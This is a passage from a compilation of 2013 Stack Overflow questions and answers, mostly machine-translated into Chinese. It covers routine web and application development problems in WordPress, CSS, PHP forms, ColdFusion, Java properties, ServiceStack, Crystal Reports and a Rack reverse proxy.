            Default:
                driver:   pdo_sqlite
                path:     :memory:
                memory:   true
    orm:
        auto_generate_proxy_classes: %kernel.debug%
        auto_mapping: true 
```

实体注解是一样的，只是因为“.” 在 sqlite 表名中不是合法字符，symfony 将其替换为“__”。不幸的是，查询数据库时没有考虑到它，所以我收到以下错误：

> SQLSTATE[HY000]: 一般错误: 1 no such table: Store.tblEmployee

（很明显，symfony创建的表叫做Store__tblEmployee）

**问题：**

有没有办法在同一个 EntityManager 上使用多个 sqlite 数据库？我需要能够跨数据库加入，就像我在连接到 mysql 数据库时所做的那样。

任何想法或帮助将不胜感激。

# android - 根据联系人号码对收件箱中的消息进行分组

> ID：14220460
> 
> 赞同：1
> 
> 时间：2013-01-08T17:13:38.687
> 
> 标签：android, database, message

我想修改我的应用程序。这是一个基于短信的应用程序。在收件箱中，我想首先查看将按发件人数量组织的消息数量，然后当我单击其中任何一个时，我希望查看与他的整个对话。

假设，五个联系人给了我 20 条消息。首先，我将显示在收件箱中有 5 项按他们的姓名/电话号码查看最新消息日期的项目，当我单击其中任何一项时，它将显示与他的整个对话。

我已经用谷歌搜索了它，但没有得到太多帮助。可能是关键字是原因还是不是。从谷歌我只知道如果我查询按组，我将有味精。但它不起作用，虽然他们说它在 android 4.0+ 之后不起作用，但我已经用 android 2.3 测试了它，唉没有工作。请帮帮我。

# wordpress - Wordpress loop to filter out by meta

> ID：14220461
> 
> 赞同：1
> 
> 时间：2013-01-08T17:13:40.733
> 
> 标签：wordpress, loops, filter, meta-tags

This kind of follows on from a previous question where JanW : [http://bit.ly/VQy9hb](http://bit.ly/VQy9hb)

I'm trying to hide posts that contain certain meta data, in this case meta_name = "smartPrivate".

The function below works but unfortunately also affects the menu loop (it just disappears).

Does anyone know how I can hide these posts from appearing in all loops but not affect the menu (and who knows what else...)

Thanks in advance Rob

```
function hide_some_posts( $query ) {

    if (!is_user_logged_in()) {

        $query->set( 'meta_query', array(

            array(
                  'key' => 'smartPrivate',
                  'value' => 'smartPrivate_loggedIn',
                  'compare' => '!='
            ),
            array(
                  'key' => 'smartPrivate',
                  'value' => 'smartPrivate_loggedInMentors',
                  'compare' => '!='
            )

        ));
    }

  return $query;
}
add_filter( 'pre_get_posts', 'hide_some_posts' ); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T18:11:51.240

So your problem is that it affects other queries than the main query, if I understand your situation correctly. This is pretty much why [is_main_query](http://codex.wordpress.org/Function_Reference/is_main_query) exists. So try this:

```
function hide_some_posts( $query ) {

    if (!is_user_logged_in() && $query->is_main_query() ) {

        $query->set( 'meta_query', array(

            array(
                  'key' => 'smartPrivate',
                  'value' => 'smartPrivate_loggedIn',
                  'compare' => '!='
            ),
            array(
                  'key' => 'smartPrivate',
                  'value' => 'smartPrivate_loggedInMentors',
                  'compare' => '!='
            )

        ));
    }

  return $query;
}
add_filter( 'pre_get_posts', 'hide_some_posts' ); 
```

# ios - 如何让 XCode 在视网膜模式下启动 iPad 模拟器？

> ID：14220465
> 
> 赞同：0
> 
> 时间：2013-01-08T17:13:52.610
> 
> 标签：ios, xcode, ios-simulator, retina-display

即使模拟器已经在视网膜模式下运行，当我通过 XCode 启动我的应用程序时，它也会切换回非视网膜模式。我的应用程序构建设置中有没有办法让它需要视网膜 iPad，或者强制模拟器在视网膜模式下运行？

运行 XCode 4、模拟器 5。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-10T10:59:25.707

我找到了缺少的设置（尽管这个问题似乎是重复的并且可以关闭）：

![在此处输入图像描述](../Images/d0f943fdce4ebd9b8c7680064ecdd22c.png)

# css - 等高 CSS 列

> ID：14220466
> 
> 赞同：-1
> 
> 时间：2013-01-08T17:13:54.327
> 
> 标签：css, multiple-columns, equal-heights

在跨浏览器 CSS示例中使用[等高列](http://matthewjamestaylor.com/blog/equal-height-columns-cross-browser-css-no-hacks "具有跨浏览器 CSS 的等高列")

HTML：

```
<div id="container1">
  <div id="col1">Column 1<br/>2</div>
    <div id="col2">Column 2</div>
    <div id="col3">Column 3</div>
</div> 
```

CSS：

```
#container1 {
    float:left;
    width:100%;
}
#col1 {
    float:left;
    width:30%;
    background:red;
}
#col2 {
    float:left;
    width:40%;
    background:yellow;
}
#col3 {
    float:left;
    width:30%;
    background:green;
} 
```

有更复杂的演示页面，但我希望将第一个示例用于我的目的。为什么示例不起作用？

[http://jsfiddle.net/YryJM/2/](http://jsfiddle.net/YryJM/2/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:27:10.303

做等高列的最简单方法是使用`display: table`.

```
#container1 {
    display: table;
    width:100%;
}

#col1, #col2, #col3 {
  display: table-cell;
}
#col1 {
    width:30%;
    background:red;
}
#col2 {
    width:40%;
    background:yellow;
}
#col3 {
    width:30%;
    background:green;
} 
```

[http://jsfiddle.net/YryJM/3/](http://jsfiddle.net/YryJM/3/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T17:29:06.317

也许这会起作用？通过设置容器 div 的固定高度，然后将 col div 设置为 100%？

```
#container1 {
float:left;
width:100%;
height:50px;
}
#col1 {
float:left;
width:30%;
background:red;
height:100%;
 }
#col2 {
float:left;
width:40%;
background:yellow;
height:100%;
}
#col3 {
float:left;
width:30%;
background:green;
height:100%;
} 
```

例如 [http://jsfiddle.net/squinny/dps4f/1/](http://jsfiddle.net/squinny/dps4f/1/)

idk这是否对您有帮助？

# coldfusion - 如果查看某个页面，则排除内容

> ID：14220469
> 
> 赞同：2
> 
> 时间：2013-01-08T17:13:59.720
> 
> 标签：coldfusion

我想知道是否可以根据将哪些内容加载到 ColdFusion 中的索引页面中来从环绕式页面页脚中排除数据

大概是这样的。

```
 IF (not = pageToBeExcluded)

     THEN {
     Show content

     } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-08T18:45:18.730

有很多方法可以做到这一点。

最简单的可能是键入页面地址。

```
<cfif CGI.SCRIPT_NAME DOES NOT CONTAIN "someArbitraryPage.cfm">
  <!--- show this content --->
  ...
</cfif> 
```

如前所述，您可能想要使用`getCurrentTemplatePath()`or `getBaseTemplatePath()`。

就个人而言，我可能会在我希望发生这种情况的模板中设置一个变量。这样做的主要好处是，每次我从我想要的文件列表中添加（或删除）一个文件时，我都不需要不断更改我的页脚代码。

```
<!--- in the template itself --->
<cfset request.suppressFooterContent = true> 
```

然后，在页脚中：

```
<cfparam name="request.suppressFooterContent" default="false">
<cfif NOT request.suppressFooterContent>
  <!--- display content here --->
  ...
</cfif> 
```

# php - $_POST 没有传递任何变量

> ID：14220473
> 
> 赞同：0
> 
> 时间：2013-01-08T17:14:09.007
> 
> 标签：php, html, forms, post

我正在为我的一个新项目构建一个高级登录系统，但是我遇到的问题是最简单的部分。发布的表单数据。

未在以下页面之间传输的数据。我已经研究了一个小时，但我找不到问题。

你们的帮助将不胜感激，谢谢。

**代码和注释：**

登录.php：

```
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <title>Live Home :: Client Login</title>

        <link rel="stylesheet" href="css/core.core.css" type="text/css" />
        <script src="http://code.jquery.com/jquery.min.js" type="text/javascript"></script>
        <script src="js/common.js" type="text/javascript"></script>
        <script src="bundles/bootstrap/js/bootstrap.min.js" type="text/javascript"></script>
    </head>

    <body>

        <header>
          <div class="bar"></div>
            <div class="btm"></div>
        </header>

        <section id="login">
          <div class="drop">
            <div class="top">
                <h2>Live Home</h2>
                <hr class="sec-sep" style="width:100px;" />
            </div>
            <section id="FOH">
                <div class="inner">
                    <form class="form-horizontal" method="post" id="logon-form" action="auth/logon.php">
                        <div class="control-group">
                            <label class="control-label" for="inputEmail">Username / Email : </label>
                            <div class="controls">
                                <input type="text" id="inputEmail" placeholder="Username / Email" />
                            </div>
                        </div>
                        <div class="control-group">
                            <label class="control-label" for="inputPassword">Password : </label>
                            <div class="controls">
                                <input type="password" id="inputPassword" placeholder="Password" />
                            </div>
                        </div>
                        <div class="control-group">
                            <a id="login-btn" class="btn btn-primary btn-mid-login">Sign in</a>
                        </div>
                    </form>
                </div>
                <div class="login-loader"></div>
            </section>
          </div>
        </section>

    <script type="text/javascript">

    $(window).bind('load resize', setPos);

    function setPos(){
        $('#login').css({
            'margin-top':   ($(window).height() / 2) - ($('#login').height() / 2) - (($(window).height() / 100) * 10)
        });
    }

    $(document).ready( function() {

        $('#login-btn').click( function() {
            $('.inner').stop(true, true).fadeOut({ duration: 700, queue: false }).slideUp(700); 
            $('.login-loader').delay(700).fadeIn(300); 
            setTimeout(function() {
                $('#logon-form').submit();  
            },2800);
        });

    });

    </script>

    </body>
</html> 
```

身份验证/logon.php：

```
<?php
    /**=====================================================================

    logon.php

    This file logs users into the main system.

    =======================================================================*/

    class access {

        function authenticate () {

            $user_request = $_POST;

            if(isset($user_request)){

                $username = $user_request['inputEmail'];

                $password = $user_request['inputPassword'];

                var_dump($_POST);

            }else{

                header("Location: ../../login.php");

            }

        }

    }

    $access = new access();
    $access -> authenticate();
?> 
```

要查看正在运行的页面，[请单击此处](http://l-h.danddcreativesolutions.co.uk/login.php)。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T17:18:05.893

原因是 PHP 使用了`name`属性。如果您的输入是`name = 'test'`在 PHP 中，那将是`$_POST['test']`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-08T17:18:49.340

您的输入字段没有“名称”属性。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-08T17:16:24.877

我会改变

```
if(isset($user_request)){ 
```

到

```
if(isset($user_request['inputEmail'], $user_request['inputPassword'])){ 
```

并`exit`在 -body 中添加一条语句，`if`以确保代码在您期望的位置结束。该标题`Location`可能发生得如此之快，以至于您看不到它。

# vb.net - 在vb中将水晶报表导出为pdf而不使用表单

> ID：14220475
> 
> 赞同：1
> 
> 时间：2013-01-08T17:14:17.920
> 
> 标签：vb.net, visual-studio-2010, crystal-reports

我是 VB 和 Crystal Reports 的新手。

我想`.exe`在 VB.NET 中创建一个不使用表单的文件。

我正在使用 Visual Studio 2010。该`.exe`文件只是纯粹用于将 Crystal Report 导出到`.pdf`文件中，我应该从哪里开始？

我应该使用`console application`吗？

我应该使用`empty project code`吗？

我搜索了互联网，找不到任何参考资料。

请让我知道是否有我可以参考的参考。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-09T09:45:16.520

您可能会使用控制台应用程序或表单应用程序，但只是不显示表单。我倾向于将人们指向以下代码示例：http: [//vb.net-informations.com/crystal-report/vb.net_crystal_report_export_pdf.htm](http://vb.net-informations.com/crystal-report/vb.net_crystal_report_export_pdf.htm)

```
Imports CrystalDecisions.CrystalReports.Engine
Imports CrystalDecisions.Shared
Public Class Form1
    Dim cryRpt As New ReportDocument

    Private Sub Button1_Click(ByVal sender As System.Object, _
    ByVal e As System.EventArgs) Handles Button1.Click
        cryRpt.Load("PUT CRYSTAL REPORT PATH HERE\CrystalReport1.rpt")
        CrystalReportViewer1.ReportSource = cryRpt
        CrystalReportViewer1.Refresh()
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, _
    ByVal e As System.EventArgs) Handles Button2.Click
        Try
            Dim CrExportOptions As ExportOptions
            Dim CrDiskFileDestinationOptions As New _
            DiskFileDestinationOptions()
            Dim CrFormatTypeOptions As New PdfRtfWordFormatOptions()
            CrDiskFileDestinationOptions.DiskFileName = _
                                        "c:\crystalExport.pdf"
            CrExportOptions = cryRpt.ExportOptions
            With CrExportOptions
                .ExportDestinationType = ExportDestinationType.DiskFile
                .ExportFormatType = ExportFormatType.PortableDocFormat
                .DestinationOptions = CrDiskFileDestinationOptions
                .FormatOptions = CrFormatTypeOptions
            End With
            cryRpt.Export()
        Catch ex As Exception
            MsgBox(ex.ToString)
        End Try
    End Sub
End Class 
```

# java - 构建统一的config.properties。如果在 Java 的属性文件中有多个具有相同键的属性怎么办？

> ID：14220476
> 
> 赞同：3
> 
> 时间：2013-01-08T17:14:19.560
> 
> 标签：java, bash, properties

我们有一种情况，`config.properties`在我们的构建过程中调用了十几个文件：

*   `config.properties.dev`
*   `config.properties.qa`
*   `config.properties.prod1`
*   `config.properties.prod2`

我们当前的安装过程`config.properties`将该环境的 复制到`config.properties`. （我对此并不感到兴奋，但这是我现在必须处理的。）

除了三个或四个属性外，所有这些文件都完全相同。不幸的是，这些在所有文件中并不总是相同的属性。我们想要做的是像这样设置一个*主人* `config.properties`：

### 掌握`config.properties`

```
prop1 = value1
prop2 = value2
prop3 = value3
prop4 = value4 
```

然后为每个环境有一个单独的`config.properties，其中只包含与主服务器不同的属性：

### `config.properties.prod`：

```
prop3 = value3.1
prop4 = value4.1 
```

### `config.properties.qa`

```
prop2 = value2.1
prop3 = value3.2 
```

我们认为在进行部署时可以将这两个文件连接在一起：

```
cat config.properties.$env >> config.properties 
```

并以这种方式获取组合属性文件：

### 结合`config.properties`

```
prop1 = value1
prop2 = value2
prop3 = value3
prop4 = value4
prop2 = value2.1
prop3 = value3.2 
```

不幸的是，我们不知道 Java 如何处理这样的文件。它是第一个定义的属性，还是最后一个定义的属性，或者行为完全未定义？

如果这不起作用，在配置脚本（通常是 BASH 脚本）中将多个属性组合到单个属性文件中的最佳方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:54:24.373

正如@home 提到的，属性是一个地图，所以最后一个（文件中的最后一个）获胜。

但是，在我看来，在合并文件时解析正确的值会更好，这样结果就具有每个属性的一个实例。这样，一旦使用了属性文件，就无需猜测了。

当然，如何解决这些问题取决于您。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T18:16:31.537

您还可以查看 apache commons-configuration 项目。它具有内置功能来组合不同的配置文件。

# php - bash 多封电子邮件

> ID：14220479
> 
> 赞同：0
> 
> 时间：2013-01-08T17:14:26.037
> 
> 标签：php, bash

需要一点帮助才能在完成脚本上向 2 个电子邮件地址发送电子邮件。

```
#!/bin/bash

DATA="date +%e-%m-%y"
SUBJET="Script executed $data"
EMAIL="email@email.com,email2@mail.com"

/usr/bin/php home/user/public_html/script1.php

sleep 60

/usr/bin/php home/user/public_html/script2.php

echo "data" | mail -s "$subjet" "$email" 
```

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T17:31:27.677

电子邮件地址应以空格分隔，而不是逗号。

另请注意，bash 变量区分大小写 ($data != $DATA)

就像是：

```
#!/bin/sh
DATE="$(date +%e-%m-%y)"
SUBJET="Script executed at ${DATE}"
EMAIL="email@email.com email2@mail.com"
echo "${DATE}" | mail -s "${SUBJET}" "${EMAIL}" 
```

**更新**

放入`date`$() 中，这样它们就会被 bash 评估

# css - 如何阻止背景图像在 IE8 及以下版本中被截断？

> ID：14220484
> 
> 赞同：2
> 
> 时间：2013-01-08T17:14:42.680
> 
> 标签：css, internet-explorer-8, background-image, media-queries

我有一个页面，其右下角固定有一位女士的背景图像。我正在使用一些媒体查询使其切换到右上角，以防止在浏览器窗口达到图像高度时她的头部被切断。这样，它只会移除下部并保持脸部在视野中。

这在支持 CSS3 的浏览器上工作得很好，但在 IE8 中，图像停留在右下角并且她的头被切断了。Respond.js 不支持 min-height 和 max-height 那么我的选择是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:16:31.257

旧浏览器的选项：使用 JavaScript 计算和设置位置。

# c# - ServiceStack razor - 从具有默认视图的服务重定向导致异常

> ID：14220486
> 
> 赞同：1
> 
> 时间：2013-01-08T17:14:47.390
> 
> 标签：c#, servicestack

我正在尝试项目级安全性。我有如下服务：

```
[DefaultView("Customer")]
public class CustomerService : MyServiceBase
{
    public object Get(CustomerRequest request)
    {
         if (UserIsAuthorizedForCustomer(request.Id))
         {
             return new CustomerResponse { Customer = GetCustomer(request.Id) };
         }
         else
         {
             return this.Redirect("/AccessDenied.htm");
         }
    }
} 
```

我遇到的问题是，当身份验证检查失败并且服务返回重定向响应时，似乎剃须刀页面仍在执行，但使用 null 模型导致 NullReferenceException。难道我做错了什么？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-09T02:03:32.330

我不确定你的实现是`Redirect`做什么的，但是重定向到错误页面的正常方法是抛出一个遵循 AppHost 中设置的重定向规则的异常。例如：

```
if (!UserIsAuthorizedForCustomer(request.Id))
    throw new UnauthorizedException("Not Authorized"); 
```

在您的 AppHost 中，您可以为不同的错误代码指定不同的重定向页面，例如：

```
SetConfig(new EndpointHostConfig {
    CustomHttpHandlers = {
        { HttpStatusCode.NotFound, new RazorHandler("/notfound") },
        { HttpStatusCode.Unauthorized, new RazorHandler("/login") },
    }
}); 
```

或者，如果您只想要 1 页，则可以为未处理的错误指定后备：

```
SetConfig(new EndpointHostConfig {
    GlobalHtmlErrorHttpHandler = new RazorHandler("/error")
}); 
```

# c# - 登录用户 c# 窗口应用程序的方法级安全性

> ID：14220488
> 
> 赞同：-1
> 
> 时间：2013-01-08T17:14:55.143
> 
> 标签：c#, .net

今天我有一个对我来说很奇怪的要求。他们告诉我们，对于 c# 代码中的每个方法，都会有一个二进制代码来标识这些方法。然后会有与此方法相关的各种权限（例如执行此方法的权限），这些权限也将具有二进制与他们相关的代码。现在对于登录用户，这些二进制数用于确定当前用户是否有权执行此操作。

我不知道，但他们说的是方法级别/二进制级别的安全性。

如果有人对此有任何想法或链接，请帮助我！

非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:25:36.890

如果这是一个要求，那么在执行您的方法时，您可以扩展`Authorize`每个方法的属性并应用一个新的自定义属性，该属性将执行此自定义检查。我同意 @ `unicorn`，已经定义`User/Roles`了身份验证结构，即成员资格或网络安全来处理这个问题。

# php - 带有wordpress作为子文件夹的Rails heroku应用程序，无法登录到管理员

> ID：14220489
> 
> 赞同：4
> 
> 时间：2013-01-08T17:14:56.330
> 
> 标签：php, ruby-on-rails, wordpress, heroku

我有一个在 Heroku 上运行的 rails 应用程序，我正在尝试在 /blog 上为我的域设置一个 Wordpress 博客，以用于 SEO 目的。我在我的 Rails 应用程序中设置了 Rack::ReverseProxy 指向博客的子域，并设置了 Wordpress 端的所有配置，以便所有 css 和链接都能正常工作。我遇到的问题是，当我转到 /blog/wp-admin 时，我被重定向到 /blog/wp-login?redirect_to={blog's subdomain}&reauth=1，在尝试登录后我被发送到同一页。

我注意到即使为正确的域设置了 Wordpress 的测试 Cookie，我也没有为登录而设置 cookie。我什至在 wp_set_auth_cookie 中的 wp-includes/pluggable.php 中跟踪它，它在成功登录后实际设置 cookie，对 setcookie 的调用返回 true，但在 cookie 未添加到我的会话之后立即（即使测试 Cookie 确实在标头中成功通过）

我看那里是不是走错了方向？是否有任何设置我应该调查才能以这种方式登录？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-07-11T23:28:31.907

我遇到了这个确切的问题，我最终将其归结为 rack-reverse-proxy 中的一个错误。set-cookie 标头以不正确的格式发送，因此只有第一个 cookie 被浏览器正确解释。那恰好是 wordpress 测试 cookie。所有其他（有用的）都被扔掉了，所以我当然无法登录。

我计划向 rack-reverse-proxy 提交一个错误和分支，但同时我在我的 config.ru 中用这个补丁修复了它：

```
class MyReverseProxy < Rack::ReverseProxy
  private
  def create_response_headers(http_response)
    response_headers = super(http_response)
    if response_headers
      if response_headers["Set-Cookie"].is_a?(Array)
        response_headers["Set-Cookie"] = response_headers["Set-Cookie"].join("\n")
      end
    end
    response_headers
  end
end

# this is to make /blog show my wordpress blog
use MyReverseProxy do
    reverse_proxy_options :preserve_host => false
    reverse_proxy(/^\/blog(\/.*)$/, 'http://your-blog-server.com$1')
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-25T05:24:18.790

我没有答案，但我有一些建议可以更好地了解正在发生的事情。

如果您使用的是 Google Chrome，请打开开发者工具的网络面板并观察登录时发生的情况。

检查为哪个域设置 cookie，当您查看处理登录的 POST 请求的响应标头时，您应该看到 Set-Cookie 标头，检查该域是 .domain.com 还是 blog .domain.com 并查看该请求是否试图将您转发到其他地方。

另一种可能性是您的 Wordpress 安装配置可能与您想要的不同，例如站点 URL 是 www.domain.com/blog 而不是 blog.domain.com

您是否可以访问 blog.domain.com/wp-admin/ 的登录页面？

# javascript - 使用 jQuery/Javascript 定义和比较 TIMESTAMP 变量？

> ID：14220491
> 
> 赞同：0
> 
> 时间：2013-01-08T17:14:57.260
> 
> 标签：javascript, jquery, sql, css

我有一个表，其中有一列使用 Oracle DB 中的时间戳变量。我不确定如何使用 JQuery 从 SQL 查询中定义我的 var“计划时间”并运行条件。我基本上将列时间戳与系统时间进行比较并返回行背景颜色。

附言。我的表在 aspx 页面内

```
// declaring the time

var currentTime = new Date();
var scheduledTime = "not sure how to declare the variable from my dynamic table"

// variables for the table
var rows = document.getElementById('ewGrid').getElementbyTagName('tr');

 // style class
.rowRed {background-color:red; color:white;}
.rowYellow {background-color:red; color white} 

$('tr').each(function() {
// if value is a number and less then zero
if (currentTime - scheduledTime) >15mins<=30mins ) {
    tr = $(this).parent();
    tr.addClass("rowRed");
 }

 }); 
```

感谢您的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:22:43.800

unix 时间戳的精度为秒，因此转换为毫秒并传递给 Date 构造函数：

```
var scheduledTime = new Date(unixtimestamp*1000)
// where unixtimestamp is the timestamp you get from the database 
```

# php - 211 使用帖子格式

> ID：14220492
> 
> 赞同：0
> 
> 时间：2013-01-08T17:15:02.737
> 
> 标签：php, wordpress

我正在开发一个主题并使用 211 主题作为我的基本主题

二十一用途`<?php get_template_part( 'content', get_post_format() ); ?>`

获取帖子

所以这些代码在 index.php 中正常工作

但是当我在自定义页面模板中使用时

它没有得到适当的格式化

```
 <?php

/*
Template Name: Vote Page Template
*/

 get_header(); ?>

 <div id="primary">

 <div class="container">
 <head>

 </head>

        <?php if ( have_posts() ) : ?>

<?php /* Start the Loop */ ?>

            <?php while ( have_posts()) : the_post(); ?>

  <?php get_template_part( 'content', get_post_format() ); ?>

            <?php endwhile; ?>

   <?php endif; ?>
  </div>
  </div>
  <?php get_footer(); ?> 
```

正确的格式 ![这是一个正确的格式](../Images/e83d0e131b1b01fd1157ee744091f8f5.png)

格式不正确

![在此处输入图像描述](../Images/fdfd6083008ce27d29fb4b37a8314b91.png)

# php - 如何从 SMTP 电子邮件发送我的 PHP 表单数据

> ID：14220494
> 
> 赞同：1
> 
> 时间：2013-01-08T17:15:19.937
> 
> 标签：php, html, forms, smtp

我的网站上有一个表格，客户可以预订锅炉服务。直到最近它还在工作，但我的网络主机已经改变了垃圾邮件过滤器。该脚本正在从服务器发送表单数据，但我现在需要从 smtp 服务器发送它。几天来我一直在搞砸这个问题，任何帮助将不胜感激。

这是我的表单代码。

```
 <form name="freecontactform" method="post" action="freecontactformprocess.php" onsubmit = "return validate.check(this)">
      <table width="400px" class="freecontactform">
    <tr>
     <td colspan="2">

     <div class="freecontactformheader">Boiler Service Form</div>

     <div class="freecontactformmessage">Fields marked with <span class="required_star"> * </span> are mandatory.</div>

     </td>
    </tr>
    <tr>
     <td valign="top">
      <label for="Full_Name" class="required">Full Name<span class="required_star"> * </span></label>
     </td>
     <td valign="top">
      <input type="text" name="Full_Name" id="Full_Name" maxlength="80" style="width:230px">
     </td>
    </tr>
    <tr>
     <td valign="top">
      <label for="Address" class="required">Address<span class="required_star"> * </span></label>
     </td>
     <td valign="top">
      <input type="text" name="Address" id="Address" maxlength="100" style="width:230px">
     </td>
    </tr>
    <tr>
     <td valign="top">
      <label for="postcode" class="not-required">Post Code</label>
     </td>
     <td valign="top">
      <input type="text" name="postcode" id="postcode" maxlength="100" style="width:230px">
     </td>
    </tr>
    <tr>
     <td valign="top">
      <label for="email" class="not-required">Email Address</label>
     </td>
     <td valign="top">
      <input type="text" name="email" id="email" maxlength="100" style="width:230px">
     </td>
     <tr>
     <td valign="top">
      <label for="Telephone_Number" class="not-required">Telephone Number</label>
     </td>
     <td valign="top">
      <input type="text" name="Telephone_Number" id="Telephone_Number" maxlength="100" style="width:230px">
     </td>
     <tr>
     <td valign="top">
      <label for="Payment" class="not-required">Payment</label>
     </td>
     <td valign="top"><p>
       <input type="radio" name="payment" value="redirect.html"/> 
         Pay Online Via PayPal<br />
         <input type="radio" name="payment" value="thankyou.html"/> 
         Card/Cash/Cheque on Day<br />
       </p></td>
    </tr>
    <tr>
     <td colspan="2" style="text-align:center" >
      <div class="antispammessage">
      To help prevent automated spam, please answer this question
      <br /><br />
          <div class="antispamquestion">
           <span class="required_star"> * </span>
           Using only numbers, what is 10 plus 15? &nbsp; 
           <input type="text" name="AntiSpam" id="AntiSpam" maxlength="100" style="width:30px">
          </div>
      </div>
     </td>
    </tr>
    <tr>
     <td colspan="2" style="text-align:center" >
     <br /><br />
      <input type="submit" value=" Submit Form "  style="width:200px;height:40px">
      <br /><br />
      <br /><br />
     </td>
    </tr>
    </table>
    </form> 
```

这是我的 PHP

```
<?php
if(isset($_POST['email'])) {

include 'freecontactformsettings.php';

function died($error) {
    echo "Sorry, but there were error(s) found with the form you submitted. ";
    echo "These errors appear below.<br /><br />";
    echo $error."<br /><br />";
    echo "Please go back and fix these errors.<br /><br />";
    die();
}
    if(!isset($_POST['Full_Name']) ||
    !isset($_POST['Address']) ||
    !isset($_POST['postcode']) ||
    !isset($_POST['email']) ||
    !isset($_POST['Telephone_Number']) ||
    !isset($_POST['payment']) || 
    !isset($_POST['AntiSpam'])      
    ) {
    died('Sorry, there appears to be a problem with your form submission.');        
}
$full_name = $_POST['Full_Name']; // required
$address = $_POST['Address']; // required
$postcode = $_POST['postcode']; // not required
$email = $_POST['email']; // not required
$telephone = $_POST['Telephone_Number']; // not required
$payment = $_POST['payment']; // required
$antispam = $_POST['AntiSpam']; // required
$error_message = "";
$email_exp = '/^[A-Za-z0-9._%-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$/';
  if(preg_match($email_exp,$email)==0) {
$error_message .= 'The Email Address you entered does not appear to be valid.<br />';
  }
  if(strlen($full_name) < 2) {
$error_message .= 'Your Name does not appear to be valid.<br />';
  }
    if($antispam <> $antispam_answer) {
$error_message .= 'The Anti-Spam answer you entered is not correct.<br />';
  }
   if(strlen($error_message) > 0) {
died($error_message);
  }
    $email_message = "Form details below.\r\n";

function clean_string($string) {
  $bad = array("content-type","bcc:","to:","cc:");
  return str_replace($bad,"",$string);
}

$email_message .= "".clean_string($full_name)."\r\n";
$email_message .= "".clean_string($address)."\r\n";
$email_message .= "".clean_string($postcode)."\r\n";
$email_message .= "".clean_string($email_from)."\r\n";
$email_message .= "".clean_string($telephone)."\r\n";
$email_message .= "".clean_string($payment)."\r\n";

$headers = "From: example@mydomain.co.uk";
$headers = 'Reply-To: '.$email."\r\n" .
'X-Mailer: PHP/' . phpversion();
mail($headers, $email_to, $email_subject, $email_message);
?>
<?php

$payment = $_POST['payment'];
if (!empty($payment))
  header( 'Location: '.$payment ) ;
}
die();
?> 
```

我需要从我的网络主机的电子邮件中发送它，它是一个 SMTP 服务器。

先感谢您

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T17:23:49.517

您可能想查看这篇方便的文章：

[http://www.9lessons.info/2009/10/send-mail-using-smtp-and-php.html](http://www.9lessons.info/2009/10/send-mail-using-smtp-and-php.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T17:19:16.213

要通过 SMTP 服务器发送，您需要使用邮件脚本，例如[PHPMailer](http://code.google.com/a/apache-extras.org/p/phpmailer/)。有关入门教程，请参见[此处](http://code.google.com/a/apache-extras.org/p/phpmailer/wiki/UsefulTutorial)。

# html - 平铺背景图像停在内容的底部，而不是页面

> ID：14220495
> 
> 赞同：0
> 
> 时间：2013-01-08T17:15:22.707
> 
> 标签：html, css

我试图让背景图像平铺并覆盖整个页面，即使没有足够的内容来填充页面。现在，背景图像停在内容的底部。我使用粘性页脚修复将页脚保持在页面底部，所以我剩下的是内容底部和页脚之间的一堆空白。

我不想用`margin`or来填充空间，`padding`因为它不会扩展到更大的显示器。

我附上了问题的图片：

![在此处输入图像描述](../Images/a5af47b1d63dcae61f59bd4fcbe28f2a.png)

这是CSS：

```
.static_pages {
    background-image: url('../img/cream_dust.png');
    background-repeat: repeat;
    position: relative;
    overflow: hidden;
    width:  100%;
    height: 100%;
    margin: 0;

}

.static_content {
    width: 80%;
    margin: 3em auto 0 auto;
}
.static_content h1 {
    color: #193441;
}
.static_content p {
    color: #193441;
    text-align: left;
    margin-top: 2em;
}
.static_content ul {
    color: #193441;
} 
```

和 HTML

```
<?php include_once('header.php'); ?>
    <section class="static_pages">
        <div class="static_content">
            <h1>Header</h1>

                <p>A little Text</p> 

        </div><!-- END class="static_content" -->
    </section><!-- END class="static_pages" -->
<?php include_once('footer.php'); ?> 
```

有任何想法吗？我已经和这个斗争了一段时间了。谢谢！

编辑： !doctype 和所有其他标题信息都在包含的 header.php 文件中。这只是网站上的几个页面之一。我有一个主索引页面，它是一个长登录页面，这是一个静态页面，用于存放联系人、关于等内容。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:34:13.963

将背景放在`HTML`标签上：

```
html {
    background: transparent url('../img/cream_dust.png') scroll repeat 0 0;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T17:17:40.960

### 你需要使用：

1.  一个正确的`doctype`！

    ```
    <!doctype html> 
    ```

2.  背景`body`

    ```
    body {
        background-image: url('../img/cream_dust.png');
        background-repeat: repeat;
    } 
    ```

3.  全高身材！

    ```
    body {height: 100%;} 
    ```

### 使用不同的背景图片：

```
<body class="pageOne">
<body class="pageTwo">
<body class="pageThree"> 
```

### CSS

```
.pageOne {background-image: url('../img/cream_dust.png');}
